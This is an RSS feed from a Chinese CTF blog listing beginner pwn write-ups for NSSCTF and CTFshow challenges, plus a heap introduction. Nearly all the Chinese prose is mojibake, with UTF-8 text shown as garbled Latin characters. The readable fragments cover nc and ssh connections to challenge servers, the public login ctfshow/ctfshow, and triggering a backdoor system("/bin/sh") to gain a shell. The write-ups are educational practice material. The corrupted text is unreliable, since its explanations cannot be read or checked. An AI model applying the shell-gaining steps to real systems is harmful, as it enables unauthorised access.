<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>CTFpwn on Expl0rer.Ct</title>
        <link>https://expl0rer.top/categories/ctfpwn/</link>
        <description>Recent content in CTFpwn on Expl0rer.Ct</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Expl0rer.Ct</copyright><atom:link href="https://expl0rer.top/categories/ctfpwn/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>NSSctf-ä¸“é¢˜PWN-writeup</title>
        <link>https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/</link>
        <pubDate>Tue, 30 Sep 2025 00:00:00 +0000</pubDate>
        
        <guid>https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/</guid>
        <description>&lt;img src="https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF.png" alt="Featured image of post NSSctf-ä¸“é¢˜PWN-writeup" /&gt;&lt;p&gt;å‰è¨€ï¼š&lt;/p&gt;
&lt;p&gt;å‡ºé¢˜ä½œè€…æ˜¯kagehutatsuï¼Œæˆ‘èŠ±äº†3680é‡‘å¸è´­ä¹°çš„ï¼Œè™½è¯´è¿˜æ˜¯PWNå…¥é—¨ï¼Œä½†æˆ‘æ„Ÿè§‰åšç‚¹æµ“ç¼©çš„åç»¼åˆçš„å…¥é—¨PWNé¢˜æ›´å¥½äº›ï¼ŒCTFshowå…¥é—¨PWNé¢˜è¯´å®è¯ç¡®å®é€‚åˆå½“æ—¶0åŸºç¡€å…¥é—¨ï¼ğŸ˜„&lt;/p&gt;
&lt;p&gt;æœ¬æ¬¡å…¥é—¨PWNå­¦ä¹ ç›¸å½“äºæˆ‘çš„ç¬¬äºŒæ¬¡â€œå…¥é—¨â€ï¼Œä»¥ä¸¤å¤–ä¸€ç§è§’åº¦å¸¦å…¥é—¨è€…æ›´è¿›ä¸€æ­¥ç†è§£PWNåŸºç¡€çŸ¥è¯†ï¼Œåœ¨&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/ctfshow-%e5%85%a5%e9%97%a8pwn-writeup/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CTFshow-å…¥é—¨PWNä¸“é¢˜&lt;/a&gt;ã€&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-1&lt;/a&gt;ã€&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-2&lt;/a&gt;ã€&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-3/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-3&lt;/a&gt;ä¸­å‡ºç°çš„å‰ç½®çŸ¥è¯†ç‚¹ï¼Œåœ¨è¿™é‡Œæœ‰æ¶‰åŠåˆ°çš„æˆ‘éƒ½ä¼šæœ‰æ‰€å¼•ç”¨å‡ºæ¥ã€‚&lt;/p&gt;
&lt;h2 id=&#34;pwnä»‹ç»&#34;&gt;PWNä»‹ç»
&lt;/h2&gt;&lt;p&gt;é¢˜ç›®ï¼šxxxï¼›å°±æ˜¯æ²¡æœ‰é¢˜ç›®ï¼Œå•¥ä¹Ÿæ²¡&lt;/p&gt;
&lt;p&gt;ä¸Šç¨‹åºncè¿æ¥çœ‹çœ‹ï¼Œåˆ«è¯´ä½ ä¸ä¼šnc&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/1.png&#34;
	width=&#34;1014&#34;
	height=&#34;164&#34;
	srcset=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/1_hu_3f179d279be1e9f2.png 480w, https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/1_hu_c3682a4e186ad5e7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;618&#34;
		data-flex-basis=&#34;1483px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å“ï¼Œè¾“å…¥å•¥éƒ½æ²¡æœ‰&amp;hellip;&lt;/p&gt;
&lt;p&gt;ç”¨IDAåˆ†æä¸€ä¸‹ï¼Œè·Ÿè¿›mainå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/2.png&#34;
	width=&#34;1120&#34;
	height=&#34;410&#34;
	srcset=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/2_hu_f1d3bf6e9b9401c9.png 480w, https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/2_hu_f4ba01d05040f7f7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;273&#34;
		data-flex-basis=&#34;655px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¥½å®¶ä¼™ï¼Œçœ‹åˆ°&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;);&lt;/code&gt;æœ‰ifåˆ¤æ–­è¯­å¥ï¼Œæ„æ€å°±æ˜¯è¯´è®©æˆ‘è¾“å…¥ä¸€ä¸ªæ•°ï¼ˆå‰é¢æœ‰ä¸ªreadå‡½æ•°é™åˆ¶å¤§å°ï¼Œä¸è¿‡é‚£ç©æ„å®¹é‡è¿™ä¹ˆå¤§ï¼Œæˆ‘å†è ¢ä¹Ÿä¸ä¼šè¯´è¾“å…¥ä¸¤ç™¾å¤šä½å­—ç¬¦ç»™ç¨‹åºå§ğŸ˜„ï¼‰ï¼Œè¿™ä¸ªæ•°ä¼šè¢«readå‡½æ•°è¯»å–ç»™bufå‚æ•°ï¼Œæ¥ç€åˆ°strcmpå‡½æ•°ï¼ˆæ¯”è¾ƒä½œç”¨ï¼Œåˆ¤æ–­æ˜¯å¦â€œä¸ç›¸ç­‰â€ï¼‰â€”â€”&lt;code&gt;if ( !strcmp(buf, &amp;quot;love\n&amp;quot;) )&lt;/code&gt;æ„æ€æ˜¯bufå’Œâ€œloveâ€å­—ç¬¦ä¸²ç›¸æ¯”çš„è¯æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœæ˜¯çœŸçš„å°±è·³åˆ°ä¸‹ä¸€æ­¥ï¼Œæ˜¾ç„¶ifä¸‹æ–¹æ˜¯systemå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¾€ç¨‹åºè¾“å…¥loveå°±å¥½å•¦ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/3.png&#34;
	width=&#34;950&#34;
	height=&#34;465&#34;
	srcset=&#34;https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/3_hu_49b9360381715028.png 480w, https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/3_hu_6b1317d937dfc4ec.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;204&#34;
		data-flex-basis=&#34;490px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°ä¸‹ä¸€æ­¥æ˜¯è¢«PWNé€šäº†çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œäº¤äº’æ¨¡å¼äº†ï¼Œç”¨lsã€catå‘½ä»¤æ‹¿åˆ°flagå§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;pwntoolsä¸gbdä½¿ç”¨&#34;&gt;Pwntoolsä¸GBDä½¿ç”¨
&lt;/h2&gt;&lt;p&gt;å–è‡ª[é¹åŸæ¯ 2024]tArScR&lt;/p&gt;
&lt;p&gt;é¢˜ç›®ï¼šæˆ‘çš„RSAæŒºæœ‰æ„æ€ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ•´æ•°æº¢å‡º&#34;&gt;æ•´æ•°æº¢å‡º
&lt;/h2&gt;&lt;h2 id=&#34;rop&#34;&gt;ROP
&lt;/h2&gt;&lt;h2 id=&#34;ret2textåŠå…¶å˜ç§&#34;&gt;ret2textåŠå…¶å˜ç§
&lt;/h2&gt;&lt;h2 id=&#34;å‡½æ•°è°ƒç”¨&#34;&gt;å‡½æ•°è°ƒç”¨
&lt;/h2&gt;&lt;h2 id=&#34;ropgadget&#34;&gt;ROPgadget
&lt;/h2&gt;&lt;h2 id=&#34;ret2sys&#34;&gt;ret2sys
&lt;/h2&gt;&lt;h2 id=&#34;ret2shellcode&#34;&gt;ret2shellcode
&lt;/h2&gt;&lt;h2 id=&#34;ret2libc&#34;&gt;ret2libc
&lt;/h2&gt;&lt;h2 id=&#34;ç»¼åˆç»ƒä¹ &#34;&gt;ç»¼åˆç»ƒä¹ 
&lt;/h2&gt;</description>
        </item>
        <item>
        <title>PWN-3</title>
        <link>https://expl0rer.top/p/pwn-3/</link>
        <pubDate>Sun, 07 Sep 2025 00:00:00 +0000</pubDate>
        
        <guid>https://expl0rer.top/p/pwn-3/</guid>
        <description>&lt;img src="https://expl0rer.top/p/pwn-3/PWN3.png" alt="Featured image of post PWN-3" /&gt;&lt;p&gt;&lt;strong&gt;å‰æ–‡ï¼šä»¥ä¸‹æ˜¯æˆ‘å…¥é—¨PWNçš„è®°å½•ï¼Œæ¬¢è¿å„ä½å‰æ¥è§‚çœ‹ï¼Œå°å¼Ÿé¢†æ•™ï¼&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å‰é¢çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å·²ç»ç²—ç•¥çš„äº†è§£äº†æ ˆç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼š
ROPã€shellcodeã€æ ˆè½¬ç§»ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;å†…å­˜ä¸­è¿˜æœ‰ä¸€å—åŒºåŸŸå«åšå †ï¼ˆheapï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥çš„ä¸€æ•´ç« çš„å†…å®¹ï¼Œæˆ‘ä»¬å°±æ¥è®²å †ã€‚&lt;/p&gt;
&lt;h2 id=&#34;linuxåŠ¨æ€å†…å­˜ç®¡ç†æœºåˆ¶&#34;&gt;LinuxåŠ¨æ€å†…å­˜ç®¡ç†æœºåˆ¶
&lt;/h2&gt;&lt;p&gt;ä»€ä¹ˆæ˜¯å †,ç°åœ¨æˆ‘æ¥å¸¦ä½ ç ”ç©¶&lt;/p&gt;
&lt;p&gt;å †æ˜¯ç¨‹åºç”¨äºåˆ†é…åŠ¨æ€å†…å­˜çš„ä¸€æ®µå†…å­˜åŒºåŸŸã€‚
ä»–ç‹¬ç«‹çš„å­˜åœ¨äºå†…å­˜ä¸­ï¼Œä»‹äºç¨‹åºå†…å­˜ åŸºåœ°å€å’Œlibcåœ°å€ä¹‹é—´ï¼Œ&lt;strong&gt;ä»ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿&lt;/strong&gt;ï¼Œä¸ç”¨æˆ·æ‰“äº¤é“æœ€å¤šã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CTFshow-å…¥é—¨PWN-writeup</title>
        <link>https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/</link>
        <pubDate>Wed, 27 Aug 2025 00:00:00 +0000</pubDate>
        
        <guid>https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/</guid>
        <description>&lt;img src="https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow.png" alt="Featured image of post CTFshow-å…¥é—¨PWN-writeup" /&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;**å‰æ–‡ï¼šä»¥ä¸‹æ˜¯æˆ‘&lt;a class=&#34;link&#34; href=&#34;https://ctf.show/challenges&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ctfshow&lt;/a&gt;çš„PWNåšé¢˜è®°å½•ï¼Œæ¬¢è¿å„ä½å‰æ¥è§‚çœ‹ï¼Œå°å¼Ÿé¢†æ•™ï¼**è¿˜æœ‰å°±æ˜¯ctfshow-pwnæ˜¯æˆ‘å…¥é—¨PWNçš„ç¬¬ä¸€å¥—é¢˜ï¼Œæ¯”è¾ƒåŸºç¡€ï¼Œçœ‹å®˜æ–¹writeupå¯ä»¥çŸ¥é“æ¯”è¾ƒç®€æ´ï¼Œä½†æœ‰äº›æˆ‘çœ‹ä¸æ‡‚ï¼Œè¿™æ˜¯æˆ‘è‡ªå·±åšçš„è¿‡ç¨‹ä¸­å†™çš„ï¼Œéƒ½æ˜¯å‘è‡ªå†…å¿ƒç†è§£å®ƒä»¬çš„è¯ï¼Œæœ‰äº›å¯èƒ½æ¯”è¾ƒå•°å—¦ï¼Œä½†ä¹Ÿå¿…é¡»è¿™æ ·ï¼Œå› ä¸ºç«™åœ¨æ–°æ‰‹è§’åº¦æ¥çœ‹å¿…é¡»è¦è¿™ç§å•°å—¦æ–¹å¼å»ç†è§£æ‰èƒ½æ›´æ·±åˆ»ï¼Œæœ‰è€å¿ƒçš„æœ‹å‹å¯ä»¥ä¸€ç›´çœ‹ä¸‹å»ï¼Œå½“ç„¶ä¹Ÿæ¬¢è¿PWNå¤§ä½¬å‰æ¥æŒ‘æˆ˜æˆ‘ï¼ï¼ï¼ğŸ˜„&lt;/p&gt;
&lt;h2 id=&#34;test_your_nc&#34;&gt;Test_your_nc
&lt;/h2&gt;&lt;h3 id=&#34;pwn_000&#34;&gt;PWN_000
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ä¸“ç”¨è™šæ‹Ÿæœºé•œåƒ&lt;/a&gt;ï¼Œå…¨å¥—åœ¨è¿™é‡Œï¼Œæå–ç showï¼›è™šæ‹Ÿæœºé•œåƒï¼Œç”¨æˆ·åä¸ºctfshowï¼Œå¯†ç æ˜¯ctfshowã€‚&lt;/p&gt;
&lt;p&gt;çœ‹äº†è¯¾ä¹Ÿå•¥éƒ½ä¸ä¼šæˆ–è€…å·¥å…·ä¸ä¼šä¸‹çœ‹è¿™&amp;ndash;&amp;gt;&lt;a class=&#34;link&#34; href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/environment/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CTF Wiki-PWN&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;è§£é¢˜è¿‡ç¨‹&#34;&gt;è§£é¢˜è¿‡ç¨‹
&lt;/h4&gt;&lt;p&gt;sshè¿æ¥ï¼ˆè®°å¾—ç»™è™šæ‹Ÿæœºkali\Ubuntuæˆ–è€…ä¸»æœºè®¾ç½®æ‰“å¼€SSHï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh ctfshow@pwn.challenge.ctf.show -pxxxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹ä¼šè®©ä½ è¾“å…¥yes/noçš„ï¼Œç›´æ¥yesï¼Œç„¶åè¾“å…¥å¯†ç ï¼Œç­‰è¿›ç¨‹ç»“æŸä¼šæœ‰ä¸ªäº¤äº’shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/1.png&#34;
	width=&#34;1184&#34;
	height=&#34;570&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/1_hu_dff3e732402d7aaa.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/1_hu_5121a93a292ddbe4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;498px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç”¨å‘½ä»¤lsæ‰“å¼€çœ‹ä¸€ä¸‹æœ‰å•¥æ–‡ä»¶ï¼Œçœ‹åˆ°æœ‰ä¸ªctfshow_flagçš„æ–‡ä»¶ï¼ŒçŒœæ˜¯ä¸ªè£…flagçš„æ–‡ä»¶å¤¹ï¼Œç›´æ¥ç”¨catå‘½ä»¤æ‰“å¼€å°±å¥½ã€‚æ³¨æ„æ–œæ /ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_001&#34;&gt;PWN_001
&lt;/h3&gt;&lt;p&gt;é¢˜ç›® &lt;a class=&#34;link&#34; href=&#34;PWN_001&#34; &gt;PWN_001&lt;/a&gt; ï¼šæä¾›åé—¨å‡½æ•°ï¼Œè¿ä¸Šå³å¯å¾—åˆ°flag&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰ç”¨åˆ°â€œ&lt;a class=&#34;link&#34; href=&#34;https://ctf.xidian.edu.cn/wiki/13&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&lt;code&gt;nc&lt;/code&gt;&lt;/a&gt;â€è¿æ¥ï¼Œå¯ä»¥äº†è§£ä¸€ä¸‹ï¼Œæ–¹ä¾¿åç»­åšé¢˜ã€‚å½“ç„¶Kaliè‡ªå¸¦ncè¿æ¥çš„ï¼Œä½ ç”¨Kaliå¹²PWNä¹Ÿè¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/2.png&#34;
	width=&#34;826&#34;
	height=&#34;310&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/2_hu_d89a142dd65a19e2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/2_hu_5516dc48b2b77e6e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;266&#34;
		data-flex-basis=&#34;639px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é¢˜é€åˆ†çš„ï¼Œncè¿æ¥ä¸€ä¸‹å°±çˆ†flagäº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸è¿‡è¯´å®è¯æˆ‘æ˜¯çœŸä¸çŸ¥é“PWN_001æ–‡ä»¶ç»™æ¥å¹²å˜›çš„ï¼Œç›´æ¥ncäº¤äº’ä¸€ä¸‹å°±å‡ºflagäº†ï¼Œè¿™é¢˜æ²¡ææ‡‚ctfshowæ„å›¾åœ¨å“ªã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/3.png&#34;
	width=&#34;1010&#34;
	height=&#34;246&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/3_hu_e6fbe5354a4e4e53.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/3_hu_9234984ec0f35806.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;checksecè§£æelfæ ¼å¼ä¿¡æ¯ã€äºŒè¿›åˆ¶æ–‡ä»¶ä¿æŠ¤é…ç½®&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;410&#34;
		data-flex-basis=&#34;985px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä¸è¿‡æˆ‘ç”¨äº†ä¸‹åˆšå­¦çš„æŒ‡ä»¤checksecçœ‹äº†çœ‹ELFæ–‡ä»¶ä¿¡æ¯ï¼Œå‘ç°æ˜¯æ²¡å¼€canaryä¿æŠ¤çš„ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´&amp;hellip;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æ˜¯64ä½ä»…å…³é—­Canaryä¿æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ç€ç”¨64ä½IDAæ‰“å¼€æŸ¥çœ‹mainå‡½æ•°ï¼ˆæŒ‰F5è¿›å…¥åæ±‡ç¼–ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/4.png&#34;
	width=&#34;1375&#34;
	height=&#34;790&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/4_hu_2ae06a810be6f21f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/4_hu_8b6f5df4cd345cc8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;174&#34;
		data-flex-basis=&#34;417px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ€ªä¸å¾—ç›´æ¥çˆ†flagå‡ºæ¥å‘¢ã€‚åé—¨systemå‡½æ•°ç›´æ¥è¿è¡Œäº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_002&#34;&gt;PWN_002
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š &lt;a class=&#34;link&#34; href=&#34;PWN_002&#34; &gt;PWN_002&lt;/a&gt; ç»™ä½ ä¸€ä¸ªshellï¼Œè¿™æ¬¡éœ€è¦ä½ è‡ªå·±å»è·å¾—flag&lt;/p&gt;
&lt;p&gt;åˆ°è¿™é‡Œåº¦è¿‡æ–°æ‰‹æœŸäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/5.png&#34;
	width=&#34;765&#34;
	height=&#34;260&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/5_hu_e343e2a59c5e743.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/5_hu_4937eed7794a387b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;294&#34;
		data-flex-basis=&#34;706px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œéœ€è¦æˆ‘ä»¬è¾“å…¥æŒ‡ä»¤äº†ï¼Œä¸€èˆ¬æ¥è¯´åšé¢˜ä¹ æƒ¯çœ‹åˆ°è¿™æ ·ç›´æ¥lsç§’çš„ï¼Œä¸è¿‡åƒæˆ‘è¿™æ ·å…¥é—¨çº§åˆ«çš„è¿˜å¾—ç”¨IDAç¢ç£¨ç¢ç£¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/8.png&#34;
	width=&#34;640&#34;
	height=&#34;160&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/8_hu_5bc43d6c8900b4ef.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/8_hu_e468d492633fbadf.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;checksecåˆ†æ&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;400&#34;
		data-flex-basis=&#34;960px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/6.png&#34;
	width=&#34;1374&#34;
	height=&#34;555&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/6_hu_540555b971908944.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/6_hu_a88e21f83ae2c018.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;IDA-x64ä½mainç¨‹åºçš„åç¼–è¯‘&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;247&#34;
		data-flex-basis=&#34;594px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æ˜¯æ²¡canaryä¿æŠ¤çš„&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/7.png&#34;
	width=&#34;909&#34;
	height=&#34;484&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/7_hu_6dedf0753937e2ce.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/7_hu_4bed3d833e192498.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;187&#34;
		data-flex-basis=&#34;450px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªç–‘é—®ï¼Œä¸ºä»€ä¹ˆsystemæœ‰è¿™ä¹ˆå¤§å¨åŠ›ï¼Ÿï¼Œè¿™æ¬¡systemé‡Œè¾¹æ˜¯ä¸€ä¸ª/bin/shçš„è½¯é“¾æ¥ï¼Œå¾ˆç±»ä¼¼æˆ‘ä»¬çš„æ–‡ä»¶åœ°å€&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;);&lt;/code&gt; æ˜¯æ¼æ´åˆ©ç”¨ä¸­è·å–ç³»ç»Ÿ shell çš„æ ¸å¿ƒæ“ä½œï¼Œå…¶å·¥ä½œåŸç†æ¶‰åŠ&lt;strong&gt;å‡½æ•°è°ƒç”¨&lt;/strong&gt;ã€&lt;strong&gt;ç³»ç»Ÿè°ƒç”¨&lt;/strong&gt;å’Œ&lt;strong&gt;è¿›ç¨‹åˆ›å»º&lt;/strong&gt;ä¸‰ä¸ªå±‚æ¬¡ï¼Œæœ¬è´¨æ˜¯é€šè¿‡æ ‡å‡†åº“å‡½æ•° &lt;code&gt;system&lt;/code&gt; å¯åŠ¨ä¸€ä¸ª &lt;code&gt;/bin/sh&lt;/code&gt; è¿›ç¨‹ï¼ˆå³å‘½ä»¤è¡Œè§£é‡Šå™¨ï¼‰ï¼Œè®©æ”»å‡»è€…è·å¾—äº¤äº’æƒé™ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;system&lt;/code&gt; æ˜¯ C æ ‡å‡†åº“ï¼ˆlibcï¼‰ä¸­çš„å‡½æ•°ï¼ŒåŸå‹ä¸ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote class=&#34;alert alert-error&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;å®ƒçš„åŠŸèƒ½æ˜¯&lt;strong&gt;æ‰§è¡Œå‚æ•° &lt;code&gt;command&lt;/code&gt; æŒ‡å‘çš„å­—ç¬¦ä¸²ä½œä¸ºç³»ç»Ÿå‘½ä»¤&lt;/strong&gt;ï¼Œç›¸å½“äºåœ¨ç»ˆç«¯ä¸­è¾“å…¥è¯¥å‘½ä»¤å¹¶æ‰§è¡Œã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
